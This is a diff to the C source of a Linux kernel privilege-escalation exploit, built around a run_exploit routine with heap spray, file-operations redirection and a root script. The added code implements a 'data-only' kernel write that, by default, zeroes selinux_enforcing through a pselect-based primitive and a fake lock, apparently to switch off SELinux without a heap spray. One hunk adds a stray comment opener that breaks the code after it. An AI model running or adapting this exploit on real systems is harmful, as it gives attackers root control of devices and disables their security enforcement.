@@ -462,6 +462,21 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   durable_stage("do_one_write_enter");
   pselect_child_node = 1;
   set_pselect_write_mode(target, 0, mode);
+  /*
+   * DATA-ONLY: no heap spray, no KS leak, no reclaim. The lock is a
+   * static .data [0,0,0,1] pattern (QEMU-verified; default
+   * init_task+0xAB8 via DATAONLY_LOCK image-offset env). The stack
+   * stamp carries the whole write (see MODE4_DATAONLY in fops.c).
+   */
+  if (env_flag("MODE4_DATAONLY", 0)) {
+    unsigned long lockoff = env_ulong("DATAONLY_LOCK", 0x27ccab8);
+    fake_lock = data_addr(KIMAGE_TEXT_BASE + lockoff);
+    pr_info("DATAONLY: lock=%016zx (image+%llx) target=%016zx val=0\n",
+            fake_lock, (unsigned long long)lockoff, target);
+    run_main_route_threads();
+    clear_pselect_write();
+    return 1;
+  }
   TIMER("  heap spray start");
   durable_stage("spray_start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
@@ -1152,6 +1167,22 @@ int run_exploit(int argc, char **argv) {
 
   write_root_script();
 
+  /*
+   * DATA-ONLY write (before all phase gating so it runs in any
+   * environment): stack-stamp rb_erase writes 0 to DATAONLY_TARGET
+   * (image offset env, default selinux_enforcing) through a static
+   * .data lock. No heap, no spray, no fops, no CFI.
+   */
+  if (env_flag("MODE4_DATAONLY", 0)) {
+    unsigned long toff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
+    uintptr_t dtgt = data_addr(KIMAGE_TEXT_BASE + toff);
+    pr_info("DATAONLY target=%016zx\n", dtgt);
+    slab_drain();
+    do_one_write(dtgt, "data-only write", 1);
+    pr_info("DATAONLY done\n");
+    return 0;
+  }
+
   /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
   int selinux_ok = check_selinux_off();
   int umh_available = active_offsets &&
@@ -1345,6 +1376,7 @@ int run_exploit(int argc, char **argv) {
       read_first_line("/proc/sys/kernel/random/boot_id", b, sizeof(b));
       live_sync_log("BOOT_BEFORE", b);
     }
+    /*
     slab_drain();
     TIMER("pre-UMH drain");
     /*
